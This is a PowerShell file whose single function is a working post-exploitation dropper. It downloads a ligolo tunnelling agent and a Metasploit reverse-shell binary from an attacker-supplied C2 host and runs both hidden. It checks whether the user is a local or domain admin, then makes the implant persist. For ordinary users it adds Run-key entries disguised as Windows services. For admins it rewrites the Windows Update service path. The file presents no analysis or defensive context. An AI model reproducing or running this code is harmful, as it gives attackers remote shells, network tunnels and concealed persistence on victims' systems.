function Invoke-Callback {
    param(
        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    # ----------------------------------------
    # 1. Prepare storage folder
    # ----------------------------------------
    $tmpDir = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
    if (!(Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }

    # Paths for binaries
    $agentPath = Join-Path $tmpDir "agent.exe"
    $revShellPath = Join-Path $tmpDir "reverse.exe"

    # ----------------------------------------
    # 2. Download & launch agent.exe (ligolo)
    # ----------------------------------------
    Invoke-WebRequest "http://$C2/payloads/agent.exe" -OutFile $agentPath
    Start-Process $agentPath -WindowStyle Hidden

    # ----------------------------------------
    # 3. Download & launch reverse.exe (Msf rev tcp)
    # ----------------------------------------
    Invoke-WebRequest "http://$C2/payloads/reverse.exe" -OutFile $revShellPath
    Start-Process $revShellPath -WindowStyle Hidden

    # ----------------------------------------
    # 4. Detect privilege level
    # ----------------------------------------
    
    # Default assumption
    $privilegeLevel = "User"

    # Check if running as local admin
    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)

    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $privilegeLevel = "LocalAdmin"
    }

    # Try domain lookup
    try {
        $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
        $currentUser = $identity.Name.Split('\')[-1]  # just username

        # Build LDAP path for "Domain Admins"
        $ldapPath = "LDAP://CN=Domain Admins,CN=Users,DC=" + ($domain -replace '\.', ',DC=')
        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ldapPath)

        $domainAdmins = $searcher.FindAll() | ForEach-Object {
            $_.Properties.samaccountname
        }

        if ($domainAdmins -contains $currentUser) {
            $privilegeLevel = "DomainAdmin"
        }
    }
    catch {
        # Not domain joined or no AD access
    }

    # ----------------------------------------
    # 5. Conditional persistence
    # ----------------------------------------
    if ($privilegeLevel -eq "User") {
        # Run-key persistence
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update Agent" -Value $agentPath
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Reverse Lookup Service" -Value $revShellPath
    }
    else {
        # Modify wuauserv to launch both binaries
        $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
        if ($svc) {
            $currentPath = $svc.PathName.Trim('"')
            $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
            $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
            Start-Service wuauserv
        }
    }
}
